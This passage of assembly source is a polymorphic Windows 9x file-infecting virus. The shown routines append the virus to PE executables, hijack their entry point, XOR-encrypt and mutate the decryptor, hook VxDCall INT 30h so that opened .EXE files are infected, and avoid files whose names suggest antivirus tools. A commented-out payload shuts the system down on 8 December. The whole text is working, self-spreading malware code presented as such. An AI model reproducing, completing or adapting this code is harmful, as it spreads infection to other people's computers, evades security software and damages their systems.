	jnz		End_OpenAndMapFile							;Yes

;Error Occured, Close Files, and Restore Attributes
	call	esi + CloseHandle, [esi + hMappedFile]	;Failed, Close File Mapping

Error_OpenAndMapFile_Mapping:
	call	esi + CloseHandle, [esi + hHostFile]	;Failed, Close the File

Error_OpenAndMapFile_Create:
	call	esi + SetFileAttributesA, oamf_szFileName, [esi + dwFileAttributes]
	xor		eax, eax								;Error, Return 0

End_OpenAndMapFile:
	ret
OpenAndMapFile ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        UnmapAndCloseFile                               | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Unmaps the open file and closes the handles associated with it. It
;	   also restores the original file attributes and file time.
;
; Arguments
;	-> uacf_szFilename: Name of the file that is being unmapped. This is
;	   used only to restore the file attributes
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> All
;_____________________
UnmapAndCloseFile PROC uacf_szFilename:DWORD
;Unmap File
	@DELTA	esi
	call	esi + UnmapViewOfFile, [esi + lpHostFile]		;Unmap the File
	call	esi + CloseHandle, [esi + hMappedFile]			;Close File Mapping

;Restore File Time
	lea		eax, [esi + ftLastAccessTime]
	lea		ebx, [esi + ftLastWriteTime]
	call	esi + SetFileTime, [esi + hHostFile], NULL, eax, ebx

;Close File
	call	esi + CloseHandle, [esi + hHostFile]			;Close the File

;Restore File Attributes
	call	esi + SetFileAttributesA, uacf_szFilename, [esi + dwFileAttributes]

	ret
UnmapAndCloseFile ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        InfectFile                                      | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Infects the host file with our virus
;
; Arguments
;	-> DWORD if_szFileName: Address of the file to be infected
;	-> DWORD if_dwIncFileSize: Size by which the section is 2B increased (Bytes)
;	-> DWORD if_dwIncSecSize: Size by which the file is 2B increased (Bytes)
;
; Return Value:
;	-> EAX: 1 if Infected, 0 on Error
;
; Registers Destroyed
;	-> All
;__________________________________
InfectFile PROC if_szFileName:DWORD
	LOCAL	lpdwLastSection:DWORD, \
			dwVirusBegin:DWORD, \
			dwNewEntryRVA:DWORD, \
			dwJumpBytes:DWORD, \
			dwIOH:DWORD, \
			dwIncFileSize:DWORD, \
			dwIncSecSize:DWORD, \
			dwDeltaOffset:DWORD

	@DELTA	esi
	mov		[dwDeltaOffset], esi		;Save Delta Offset

;Check if the file can be infected, or not
	call	CanFileBeInfected, if_szFileName
	test	eax, eax					;Can it be infected
	jz		End_InfectFile				;No
	mov		[dwIncFileSize], ebx		;Save Increase in File Size
	mov		[dwIncSecSize], ecx			;Save Increase in Section Size

;Map Host File into Memory
	call	OpenAndMapFile, if_szFileName, dwIncFileSize
	test	eax, eax					;File Opened and Mapped Successfully
	jz		End_InfectFile				;No, Return Code = 0
	mov		esi, [dwDeltaOffset]
	mov		[esi + lpHostFile], eax		;Save staring address of file

;Get File Headers
	call	GetFileHeaders, eax			;This should not fail, since its already...
	mov		[dwIOH], ebx				;...called once in CanFileBeInfected
	mov		[lpdwLastSection], ecx

;Calculate the Starting of Virus Code in File
	mov		eax, (IMAGE_SECTION_HEADER [ecx]).ISH_PointerToRawData
	add		eax, (IMAGE_SECTION_HEADER [ecx]).ISH_SizeOfRawData
	mov		[dwVirusBegin], eax			;RVA of New Entry Point in File

;Calculate RVA of New Entry Point
	mov		ebx, [lpdwLastSection]
	sub		eax, (IMAGE_SECTION_HEADER [ebx]).ISH_PointerToRawData
	add		eax, (IMAGE_SECTION_HEADER [ebx]).ISH_VirtualAddress
	mov		[dwNewEntryRVA], eax

;Calculate Bytes of JMP Instruction
	add		eax, offset ReturnToHost - offset StartOfVirusCode
	mov		ebx, [dwIOH]
	sub		eax, (IMAGE_OPTIONAL_HEADER [ebx]).IOH_AddressOfEntryPoint
	add		eax, 4
	not		eax
	mov		[dwJumpBytes], eax				;Save Bytes

;Append the Virus to the host
	mov		esi, offset StartOfVirusCode	;Copy Virus from Here...
	add		esi, [dwDeltaOffset]			;since StartOfVirusCode will vary after infection
	mov		edi, [dwVirusBegin]				;...to here
	mov		ebx, [dwDeltaOffset]
	add		edi, [ebx + lpHostFile]			;true location to copy to
	mov		ecx, VIRUS_SIZE
	rep		movsb

;Write New Jump Instruction in File
	;Offset in File where operand to JMP instruction is to be put
	mov		ebx, offset ReturnToHost + 1 - offset StartOfVirusCode
	add		ebx, [dwVirusBegin]			;True offset in file
	mov		esi, [dwDeltaOffset]
	add		ebx, [esi + lpHostFile]		;Correct offset in Memory Mapped File
	mov		ecx, [dwJumpBytes]			;Get operand for jmp instruction
	mov		[ebx], ecx					;Put it in the file

;Update the Last Section Header
	mov		eax, [lpdwLastSection]
	mov		ebx, [dwIncSecSize]
	mov		ecx, [dwIncFileSize]
	add		(IMAGE_SECTION_HEADER [eax]).ISH_SizeOfRawData, ecx
	add		(IMAGE_SECTION_HEADER [eax]).ISH_VirtualSize, ebx
	or		(IMAGE_SECTION_HEADER [eax]).ISH_Characteristics, IMAGE_READ_WRITE_EXECUTE

;Fix VirtualSize (if Required) for files like TRACERT.EXE)
	mov		ebx, (IMAGE_SECTION_HEADER [eax]).ISH_SizeOfRawData
	cmp		(IMAGE_SECTION_HEADER [eax]).ISH_VirtualSize, ebx	;Virtual Size Wrong
	jge		VirtualSizeFine										;No, Fix Not Required
	mov		(IMAGE_SECTION_HEADER [eax]).ISH_VirtualSize, ebx	;Yes, Fix it

VirtualSizeFine:

;Update the PE Header (Image Size)
	mov		ebx, [dwIOH]				;Address of Image Optional Header
	add		(IMAGE_OPTIONAL_HEADER [ebx]).IOH_SizeOfImage, ecx

;Update the PE Header (Entry RVA)
	mov		ecx, [dwNewEntryRVA]		;Get New Entry RVA
	mov		(IMAGE_OPTIONAL_HEADER [ebx]).IOH_AddressOfEntryPoint, ecx

;Update the Win32VersionValue field. This is used as a Virus Signature
	mov		(IMAGE_OPTIONAL_HEADER [ebx]).IOH_Win32VersionValue, VIRUS_SIGNATURE

;Encrypt the file, and Close it
	mov		ebx, [dwDeltaOffset]
	mov		edi, [ebx + lpHostFile]			;Staring address of Host File
	add		edi, [dwVirusBegin]				;Address of virus in file
	call	EncryptVirus

	call	UnmapAndCloseFile, if_szFileName
	xor		eax, eax
	inc		eax								;All OK, Return Code 1

End_InfectFile:
	ret
InfectFile ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        EncryptVirus                                    | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Encrypts the Virus Code with a random byte, and mutates the decryptor,
;	   making the virus Encrypted & Polymorphic
;
; Arguments
;	-> EDI: Starting address of Virus in Memory Mapped File
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> All except EDI
;________________
EncryptVirus PROC
	push	edi						;Save starting address of virus code

;Get Encryption Key, to be used for encrypting/decrypting
	;@DELTA	esi
	;call	esi + GetTickCount		;Get random number in EAX (AL)

	in		al, 40h					;Get random encryption key
	IF DEBUG
		xor		al, al				;Don't encrypt in Debug Mode
	ENDIF

	mov		ecx, ENCRYPTED_SIZE
	add		edi, LOADER_SIZE		;Don't enrypt the loader !!
EncryptByte:
	xor		byte ptr [edi], al		;al = Encryption Key
	inc		edi
	loop	EncryptByte

	pop		edi						;restore starting address of virus code

;Update the Encryption Key in the decryptor
	mov		byte ptr [edi + EncryptionKey - StartOfVirusCode], al

;Mutate the Decryptor
	call	MutateDecryptor

	ret
EncryptVirus ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                          StringLength                                  | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Returns the length of the string
;
; Arguments
;	-> DWORD sl_lpszString: Address of the string
;
; Return Value:
;	-> EAX: Length of the string
;
; Registers Destroyed
;	-> EAX, ECX, EDI
;____________________________________
StringLength PROC sl_lpszString:DWORD
	mov		edi, sl_lpszString			;string whose length is required
	xor		ecx, ecx
	dec		ecx						;ecx = -1, search till infinity
	xor		eax, eax				;search for NULL character
	repne	scasb					;Find the terminating NULL
	not		ecx
	dec		ecx						;length of string
	mov		eax, ecx				;return length of string
	ret
StringLength ENDP
;****************************************************************************
;								TimerProc
;****************************************************************************
; Description
;	-> This function is called when the Time-out value for the Timer Expires.
;
; Arguments
;	-> tp_hwnd: Handle of the window
;	   tp_uMsg: WM_TIMER
;	   tp_idEvent: ID of the timer
;	   tp_dwTimer: Value of GetTickCount()
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> All
;_____________________________________________________________________________
;TimerProc PROC tp_hwnd:DWORD, tp_uMsg:DWORD, tp_idEvent:DWORD, tp_dwTime:DWORD
;	LOCAL	dwDeltaOffset:DWORD, \
;			dwFileNumber:DWORD, \
;			stTime:SYSTEMTIME
;	pushad										;must save, since this is a CALLBACK fn
;	@DELTA	esi
;	mov		[dwDeltaOffset], esi
;
;Check if Date is 8th December
;	lea		eax, stTime
;	call	esi + GetLocalTime, eax
;	cmp		stTime.ST_wMonth, 12			;is Month = December
;	jne		Not_8_December					;No
;	cmp		stTime.ST_wDay, 8				;Yes. Is Day = 8th
;	jne		Not_8_December					;No
;
;Deliever Payload since date is 8th December
;	call	PayLoad
;
;Not_8_December:
;
;Lock System if Windows has been running for a long time
;	;cmp	tp_dwTime, MAX_RUN_TIME				;Is Windows Up-time > 2 hours
;	;jle	NoLockWindows						;No
;	;DB		0F0h								;Yes, use F00F Bug to hang / lock System
;	;DB		0Fh
;	;DB		0C7h
;	;DB		0C8h
;
;NoLockWindows:
;
;
;End_TimerElapsed:
;	popad										;restore state
;	ret
;TimerProc ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                           CanFileBeInfected                            | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function checks if a file can be infected or not. It checks the
;	   following:
;	   1. File must be an EXE
;	   2. File must be a PE
;	   3. It must not be a DLL
;	   4. File must not be infected by our virus
;	   5. It must not be a Winzip Self-Extractor File
;
;	   If all the above conditions are met, this function returns the size, in
;	   bytes, by which the file and section must be increased when the file is
;	   infected.
;
; Arguments
;	-> DWORD cfbe_szFileName: ASCIIZ Name of the file to check
;
; Return Value:
;	-> EAX: 1 if the file can be infected, 0 Otherwise
;	-> EBX: Bytes by which the file size must be increased if it is infected
;	-> ECX: Bytes by which the last section size must be increased if it is infected
;
; Registers Destroyed
;	-> All
;___________________________________________
CanFileBeInfected PROC cfbe_szFileName:DWORD
;Map File, without increasing the File Size
	call	OpenAndMapFile, cfbe_szFileName, 0
	test	eax, eax						;File Opened & Mapped Successfully
	jz		End_CanFileBeInfected			;No, Return with Error Code = 0

;Get File Headers
	call	GetFileHeaders, eax
	test	eax, eax						;Successfully retreived file headers
	je		End_CanFileBeInfected			;No, probably not a PE file

;Check if file is infected. We use the Win32VersionValue for storing our signature
	cmp		(IMAGE_OPTIONAL_HEADER [ebx]).IOH_Win32VersionValue, VIRUS_SIGNATURE
	jz		Error_CanFileBeInfected			;File is already infected

;Check if file is a DLL
	test	(IMAGE_FILE_HEADER [eax]).IFH_Characteristics, IMAGE_FILE_DLL
	jnz		Error_CanFileBeInfected			;Yes

;Check if last section is sharable
	;mov		edx, (IMAGE_SECTION_HEADER [ecx]).ISH_Characteristics
	;and		edx, IMAGE_SCN_MEM_SHARED		;Is Section Sharable
	;jnz		Error_CanFileBeInfected			;Yes, don't infect

;Don't infect Winzip Self-Extractor Files.
	;The last section of this file has the name _winzip_. Note that Winzip
	;Self-Extrator Personal Edition Files will still be infected, since they
	;don't have this section
	cmp		dword ptr (IMAGE_SECTION_HEADER [ecx]).ISH_Name, "niw_"		;"_win" ?
	je		Error_CanFileBeInfected										;Yes, dont infect

;OK, File can be infected, Great !!, ;-)
	mov		eax, ebx						;Image Optional Header
	mov		ebx, (IMAGE_OPTIONAL_HEADER [eax]).IOH_FileAlignment
	mov		ecx, (IMAGE_OPTIONAL_HEADER [eax]).IOH_SectionAlignment

;Calculate Increase in Section size
	;INC_SEC_SIZE = [(VIRUS_SIZE - 1 + SECTION_ALIGN) / SECTION_ALIGN] * SECTION_ALIGN
	mov		eax, VIRUS_SIZE - 1
	add		eax, ecx					;Add Section Alignment
	xor		edx, edx					;We need to divide only EAX
	div		ecx							;Divide by SECTION_ALIGN
	mul		ecx							;Multiply by SECTION_ALIGN
	push	eax							;Save Increase in Section Size

;Calculate Increase in File Size
	;INC_FILE_SIZE = (INC_SEC_SIZE - 1 + FILE_ALIGN) / FILE_ALIGN] * FILE_ALIGN
	;mov		eax, VIRUS_SIZE;**NEW LINE
	;dec		eax							;INC_SEC_SIZE - 1
	mov		eax, VIRUS_SIZE - 1
	add		eax, ebx					;Add File Alignment, FILE_ALIGN
	div		ebx							;Divide by FILE_ALIGN
	mul		ebx							;Multiply by FILE_ALIGN
	push	eax							;Save Increase in File Size

;Close the file, and return relevant values
	call	UnmapAndCloseFile, cfbe_szFileName
	pop		ebx							;Get Increase in File Size
	pop		ecx							;Get Increase in Section Size
	xor		eax, eax
	inc		eax							;Return Code 1
	jmp		End_CanFileBeInfected

Error_CanFileBeInfected:
	call	UnmapAndCloseFile, cfbe_szFileName
	xor		eax, eax					;Return Code 0

End_CanFileBeInfected:
	ret
CanFileBeInfected ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            PayLoad                                     | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function is called on the 8th of December. It delievers the Payload
;	   of the virus.
;
; Arguments
;	-> None.
;
; Return Value:
;	-> None.
;
; Registers Destroyed
;	-> All
;___________
;PayLoad PROC
;	@DELTA	esi
;	;call	ExitWindowsEx, EWX_FORCE OR EWX_SHUTDOWN, NULL
;	call	esi + ExitWindowsEx, EWX_SHUTDOWN, NULL
;	ret
;PayLoad ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                       CanMachineBeInfected                             | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function is called to check if the virus should infect this machine
;	   or not. This is used, so that the virus doesn't infect My Machine !!
;
; Arguments
;	-> None.
;
; Return Value:
;	-> EAX: 0 -> machine should not be infected, else it can be infected
;
; Registers Destroyed
;	-> All
;________________________
CanMachineBeInfected PROC
	@DELTA	esi

;Check if the "No Infect" file exists on the current machine
	mov		eax, esi
	add		eax, offset szNoInfectFileName
	call	esi + CreateFileA, eax, GENERIC_READ, FILE_SHARE_READ, NULL, \
				OPEN_EXISTING, NULL, NULL
	cmp		eax, INVALID_HANDLE_VALUE	;File Opened ?
	je		End_CanMachineBeInfected	;No, so machine can be infected

;Close the file, and return 0, since its probably my machine
	call	esi + CloseHandle, eax
	xor		eax, eax					;return 0, so that machine is not infected

End_CanMachineBeInfected:
	ret
CanMachineBeInfected ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            RelocateVirus                               | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function allocates memory in the Shared area and copies the Virus
;	   to that area.
;
; Arguments
;	-> None.
;
; Return Value:
;	-> EAX: Base address of Memory where the Virus was copied, or NULL if an
;	   error occured.
;
; Registers Destroyed
;	-> All
;_________________
RelocateVirus PROC
	LOCAL	dwDeltaOffset:DWORD, \
			dwMemoryRegion:DWORD

	@DELTA	esi
	mov		[dwDeltaOffset], esi

;Reserve Shared Memory
	@DELTA	esi
	call	esi + VxDCall, PageReserve, PR_SHARED, VIRUS_SIZE_PAGES, \
				PC_WRITEABLE OR PC_USER
	cmp		eax, INVALID_HANDLE_VALUE			;Memory Allocate Successfully?
	je		Error_RelocateVirus					;No
	cmp		eax, SHARED_MEMORY					;Shared memory Allocated?
	jb		Error_RelocateVirus					;No

;Save Address of Region
	mov		[dwMemoryRegion], eax

;Commit Shared Memory
	shr		eax, 0Ch							;Page Number
	mov		esi, [dwDeltaOffset]
	call	esi + VxDCall, PageCommit, eax, VIRUS_SIZE_PAGES, PD_ZEROINIT, 0, \
        			 PC_WRITEABLE OR PC_USER OR PC_PRESENT OR PC_FIXED
	or		eax,eax
	je		Error_RelocateVirus

;Copy Virus to Newly Allocate Memory
	mov		esi, dwDeltaOffset
	add		esi, offset StartOfVirusCode		;Start Copying From Here
	mov		edi, [dwMemoryRegion]				;Copy Here
	mov		ecx, VIRUS_SIZE						;Size to Copy
	rep		movsb

	mov		eax, [dwMemoryRegion]				;Return Region of Shared Memory Allocated
	jmp		End_RelocateVirus

Error_RelocateVirus:
	xor		eax, eax							;Return 0, since an error occured

End_RelocateVirus:
	ret
RelocateVirus ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                      InstallHookProcedure                              | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function installs a hook procedure to monitor VxDCalls
;
; Arguments
;	-> None.
;
; Return Value:
;	-> None.
;
; Registers Destroyed
;	-> All
;________________________
InstallHookProcedure PROC
	LOCAL		dwDeltaOffset:DWORD

    @DELTA	esi
    mov		[dwDeltaOffset], esi

;Modify the JMP instruction, so that it points to the address of OldInt30
	mov		eax, esi
	add		eax, offset	OldInt30Address		;Bytes to modify
	mov		ebx, esi
	add		ebx, offset OldInt30			;Address of OldInt30
	mov		[eax], ebx						;Modify JMP instruction

;The disassembly of the VxDCall function looks like this:
;
;8B 44 24 04				MOV		EAX, DWORD PTR [ESP+04h]
;8F 04 24					POP		DWORD PTR [ESP]
;2E FF 1D XX XX XX XX		CALL	FWORD PTR CS:[XXXXXXXX]
;
;The last instuction points to an INT 30h instruction that is used by
;VxDCall to jump to Ring 0. So, to hook VxDCall's, we must modify the
;address pointed to by the CALL, i.e. XXXXXX, so that it points to our
;code. Before that, we should save the current address, so that we can
;call the old INT 30h

;Trace through VxDCall, until we come to the XXXXXXXX bytes
    add		esi, offset VxDCall
    mov		esi, [esi]					;First byte of VxDCall function
    mov		ecx, 50						;Scan upto 50 bytes
TraceVxDCall:
    lodsb								;Get current byte
    cmp		al, 2Eh						;First byte of CALL instruction?
    jne		TraceVxDCall_NextByte		;No, check next byte
    cmp		word ptr [esi], 1DFFh		;Next two bytes of instruction?
    je		TraceVxDCall_AddressFound	;Yes
TraceVxDCall_NextByte:
	loop	TraceVxDCall				;Continue Checking...

TraceVxDCall_AddressFound:
;Save Current INT 30h Address
	cli									;Cannot afford to be interrupted
	lodsw								;Skip over FF and 1D opcodes of CALL
	lodsd								;Pointer to INT 30h instruction, XXXXXXXX
	mov		esi, eax					;Copy Bytes From Here
	mov		edi, [dwDeltaOffset]
	add		edi, offset OldInt30		;To Here
	mov		ecx, 6						;Save 6 bytes, FWORD
	rep		movsb

;Install New INT 30h Handler
    mov		edi, eax					;Pointer to INT 30h instruction
    mov		eax, [dwDeltaOffset]
    add		eax, offset VxDInt30Handler	;Copy This Address
    stosd								;Save 4 bytes ...
    mov		ax, cs
    stosw								;and 2 bytes (since FWORD instruction)
    sti									;Handler installed, enable interrupts
    ret
InstallHookProcedure ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                           VxDInt30Handler                              | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This is the hook procedure that monitors VxDCalls (INT 30h)
;
; Arguments
;	-> None.
;
; Return Value:
;	-> None.
;
; Registers Destroyed
;	-> All
;___________________
VxDInt30Handler PROC
		pushad							;Save all, since this is an interrupt handler

;Make sure that we don't process our own calls
		@OFFSET	ebp, VxDCall_Busy
		cmp		byte ptr [ebp], TRUE				;Is Virus busy
		je		Exit_VxDInt30Handler				;Yes, prevent re-entrancy

;Process only INT 21h Services
		cmp		eax, VWIN32_Int21Dispatch			;VWIN32 VxD int 21h?
		jne		Exit_VxDInt30Handler

		mov		eax,dword ptr [esp+0000002Ch]		;Get 21h Service
		cmp		ax, RESIDENCY_CHECK_SERVICE			;Check for Residency?
		je		Residency_Check						;Yes
		cmp 	ax, LFN_OPEN_FILE_EXTENDED			;LFN Open Extended
		je 		Extended_File_Open

		jmp 	Exit_VxDInt30Handler				;None, go to default handler

Residency_Check:
;Virus Residency Check
		popad										;Restore stack and other regs
		mov		esi, RESIDENCY_SUCCESS				;Tell caller that we're resident
		jmp		Original_VxDInt30Handler			;Go to original handler

Extended_File_Open:
;Prevent Re-entrancy
		@OFFSET	eax, VxDCall_Busy
		mov		byte ptr [eax], TRUE

		push	esi
		call	IsFilenameOK, esi
		pop		esi
		or		eax, eax
		jz		File_Not_Executable

;Do Stuff
		;call	OutputFileName
		call	InfectFile, esi

File_Not_Executable:
;Finished Processing
		@OFFSET	eax, VxDCall_Busy
		mov		byte ptr [eax], FALSE

Exit_VxDInt30Handler:
		popad							;Restore, before transfering control

Original_VxDInt30Handler:
;The following bytes will be translated to JMP FWORD PTR CS:[00000000]
		DB 2Eh, 0FFh, 2Dh				;JMP FWORD PTR CS:[XXXXXXXX]
OldInt30Address:						;The following 4 bytes will be replaced by the
		DB 4 DUP (0)					;address of OldInt30 in memory.
		;ret							;Not required, since we're jumping out
VxDInt30Handler ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            IsFilenameOK                                | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function checks if the filename is OK for infection or not. If the
;	   filename meets any of the folling criteria, this function returns a
;	   failure.
;			* Filename is less than 5 characters. This is checked, because
;			  we are infecting only .EXE files, so the minimum length of such
;			  a file is 5 characters
;			* The filename must end in ".EXE" (or ".XYZ" for DEBUG mode). The
;			  comparison is case insensitive
;			* The filename must NOT consist of any of the following pairs of
;			  characters, viz., "AV", "AN", "F-". This is done to prevent
;			  infection of Anti-Virus program files.
;
; Arguments
;	-> ife_szFilename:	Address of the buffer where the filename is stored
;
; Return Value:
;	-> EAX:	1 if the filename is OK, 0 otherwise
;
; Registers Destroyed
;	-> All
;___________________________________
IsFilenameOK PROC ife_szFilename
	LOCAL	szExtention[4]:BYTE

;Check Filename Length
	mov		esi, ife_szFilename
	call	StringLength, esi		;Get length of filename
	cmp		eax, 4					;Is File name less than 5 characters (.EXE)
	jl		Error_IsFilenameOk		;Yes, Don't infect
	push	eax						;Save Length of Filename

;Get File Extention
	mov		eax, [esi + eax - 4]	;File Extention (including ".")
	lea		edx, szExtention		;Get Address of Extention Buffer
	mov		[edx], eax				;Store extention in buffer

;Convert to upper case
	mov		ecx, 3					;3 characters to be converted
ToUpperCase:
	inc		edx						;Don't have to check "." for upper case
	cmp		byte ptr [edx], "a"
	jl		NextCharacter
	cmp		byte ptr [edx], "z"
	jg		NextCharacter
	sub		byte ptr [edx], "a" - "A"	;Convert to upper case
NextCharacter:
	loop	ToUpperCase

	pop		ecx						;Get Length of Filename

;Check the Extention
	IF DEBUG
		cmp		dword ptr [edx - 3], "ZYX."	;Is Extention ".XYZ" (Debug Only)
	ELSE
		ERR		"Release Mode, Executables will be Infected !!!"	;Comment to assemble
		cmp		dword ptr [edx - 3], "EXE."	;Is Extention ".XYZ" (Release Only)
	ENDIF
	jne		Error_IsFilenameOk			;No, Extention doesn't match

;Check Anti-Virus Program Files
	dec		ecx						;Since we're checking 2 char, last char not reqd
CheckAntiVirusFiles:
	cmp		word ptr [esi], "VA"	;"AV"; for NAV (Norton), TBAV (ThunderByte)
	je		Error_IsFilenameOk
	cmp		word ptr [esi], "va"
	je		Error_IsFilenameOk
	cmp		word ptr [esi], "-F"	;"F-"; for F-PROT
	je		Error_IsFilenameOk
	cmp		word ptr [esi], "NA"	;"AN", for SCAN (McAfee), CLEAN
	je		Error_IsFilenameOk
	cmp		word ptr [esi], "na"
	je		Error_IsFilenameOk
	inc		esi						;Next Character
	loop	CheckAntiVirusFiles		;Check All

	xor		eax, eax
	inc		eax
	jmp		End_IsFilenameOk

Error_IsFilenameOk:
	xor		eax, eax

End_IsFilenameOk:
	ret
IsFilenameOK ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                                                                        | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
OutputFileName PROC
	LOCAL	dwFilename:DWORD, \
			dwDeltaOffset:DWORD

	mov		[dwFilename], esi
	@DELTA	esi
    mov		[dwDeltaOffset], esi

;Create File to write into
	mov		edx, [dwDeltaOffset]
	add		edx, offset szOutputFile
	mov		esi, 0BFF77ADFh
	call	esi, edx, GENERIC_READ OR GENERIC_WRITE, FILE_SHARE_READ, \
				0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
	cmp		eax, INVALID_HANDLE_VALUE
	je		End_OutputFileName

;Go to end of file
	push	eax								;Save Handle
	mov		esi, 0BFF7713Fh					;SetFilePointer
	call	esi, eax, 0, 0, 2
	pop		eax								;Restore Handle

;Get Length of FileName
	push	eax								;Save Handle
	mov		edx, [dwFilename]
	mov		esi, 0BFF773ADh					;lstrlen
	call	esi, edx
	mov		ebx, eax						;length of filename
	pop		eax								;Restore Handle

;Write Into File
	push	eax								;save handle
	push	eax								;Create Buffer, used for number of bytes written
	lea		ecx, [esp - 4]
	mov		edx, [dwFilename]
	mov		esi,0BFF76FD5h					;WriteFile
	call	esi, eax, edx, ebx, ecx, 0
	pop		eax								;Remove Buffer
	pop		eax								;restore handle

;Close File
	mov		esi, 0BFF7E064h
	call	esi, eax

End_OutputFileName:
		ret
OutputFileName ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            IsVirusActive                               | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function returns 1 if the virus is active in memory, else returns
;	   0. This function also saves the address of the VxDCall API.
;
; Arguments
;	-> None.
;
; Return Value:
;	-> EAX:	1 if the Virus is Resident. 0 otherwise
;
; Registers Destroyed
;	-> All
;_________________
IsVirusActive PROC
	call	GetAddressOfKernelAPI, 0	;Get Address Of VxDCall API
	test	eax, eax					;Found Address ?
	jz		End_IsVirusActive			;No, Return 0

;Save address of VxDCall API
	@OFFSET	ebx, VxDCall
	mov		[ebx], eax					;Save Address

	;Check if Virus is Already Resident
	@CALL_INT21h RESIDENCY_CHECK_SERVICE
	xor		eax, eax					;Assume not resident
	cmp		esi, RESIDENCY_SUCCESS		;Is Virus Resident
	jne		End_IsVirusActive			;No, return 0
	inc		eax							;Yes, return 1

End_IsVirusActive:
	ret
IsVirusActive ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            GetFileHeaders                              | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function retreives the address of various file headers, viz.,
;	   Image File Header, Image Optional Header, Last Section Header,
;	   Image Export Directory. The function fails if the specified file is
;	   not a Portable Executable (PE) file
;
; Arguments
;	-> gfh_dwFileBase: Base Address of File (in Memory) whose headers are
;	   required.
;
; Return Value:
;	-> EAX:	Address of the Image File Header, or 0 if the function failed
;	-> EBX:	Address of the Image Optional Header
;	-> ECX:	Address of the Last Sections Header
;	-> EDX:	Address of the Image Export Directory
;
; Registers Destroyed
;	-> All
;_______________________________________
GetFileHeaders PROC gfh_dwFileBase:DWORD
	LOCAL	dwIOH:DWORD, \
			dwIED:DWORD, \

	mov		esi, [gfh_dwFileBase]
	cmp		word ptr [esi], "ZM"				;Is EXE/DLL Present ?
	jne		Error_GetFileHeaders				;No

;Check for PE Signature
	add		esi, (IMAGE_DOS_HEADER [esi]).IDH_e_lfanew
	cmp		dword ptr [esi], "EP"				;PE File ?
	jne		Error_GetFileHeaders				;No

;Get Image Optional Header
	add		esi, IMAGE_SIZEOF_NT_SIGNATURE		;Image File Header
	push	esi									;Save Image File Header
	add		esi, SIZE IMAGE_FILE_HEADER			;Image Optional Header
	mov		[dwIOH], esi						;Save

;Get the Address of the Image Export Directory
	mov		esi, (IMAGE_OPTIONAL_HEADER [esi]).IOH_DataDirectory(0).IDD_VirtualAddress	;RVA Image Export Directory
	add		esi, [gfh_dwFileBase]
	mov		dword ptr [dwIED], esi

;Get Address of Last Section Header
	pop		esi									;Get Image File header
	movzx	ecx, (IMAGE_FILE_HEADER [esi]).IFH_SizeOfOptionalHeader
	add		ecx, [dwIOH]							;Address of First Section Header
	movzx	eax, (IMAGE_FILE_HEADER [esi]).IFH_NumberOfSections
	dec		eax									;Number of Sections - 1
	imul	eax, eax, SIZE IMAGE_SECTION_HEADER	;Size of All Section Headers
	;mov		ebx, SIZE IMAGE_SECTION_HEADER
	;mul		ebx									;Size of All Section Headers
	add		ecx, eax							;Address of Last Section Header

;Return Header Values
	mov		eax, esi							;Image File Header
	mov		ebx, [dwIOH]
	mov		edx, [dwIED]

	jmp		End_GetFileHeaders

Error_GetFileHeaders:
	xor		eax, eax							;Error, Return 0

End_GetFileHeaders:
	ret
GetFileHeaders ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            MutateDecryptor                             | |
;| |                                                                        | |
